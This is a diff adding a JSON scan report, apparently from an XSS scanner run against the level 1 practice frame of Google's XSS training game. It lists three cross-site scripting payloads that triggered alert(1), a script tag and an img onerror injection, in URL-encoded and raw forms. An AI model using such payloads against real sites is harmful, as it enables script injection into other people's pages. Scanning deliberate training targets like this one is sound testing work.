@@ -1,0 +1,25 @@
+{
+    "targetUrl": "https://xss-game.appspot.com/level1/frame?query=tes",
+    "startScanTimeStamp": "08/28/2020, 13:58:06",
+    "endScanTimeStamp": "08/28/2020, 13:58:45",
+    "results": [
+        {
+            "count": 1,
+            "scanType": "URL Query",
+            "payload": "query=%3CScRiPt%3Ealert%281%29%3C%2FsCriPt%3E%0A",
+            "url": "https://xss-game.appspot.com/level1/frame?query=%3CScRiPt%3Ealert%281%29%3C%2FsCriPt%3E%0A"
+        },
+        {
+            "count": 2,
+            "scanType": "URL Query",
+            "payload": "query=%3Cimg+src%3Dxss+onerror%3Dalert%281%29%3E",
+            "url": "https://xss-game.appspot.com/level1/frame?query=%3Cimg+src%3Dxss+onerror%3Dalert%281%29%3E"
+        },
+        {
+            "count": 3,
+            "scanType": "HTML Injection",
+            "payload": "<img src=xss onerror=alert(1)>",
+            "url": "https://xss-game.appspot.com/level1/frame"
+        }
+    ]
+}
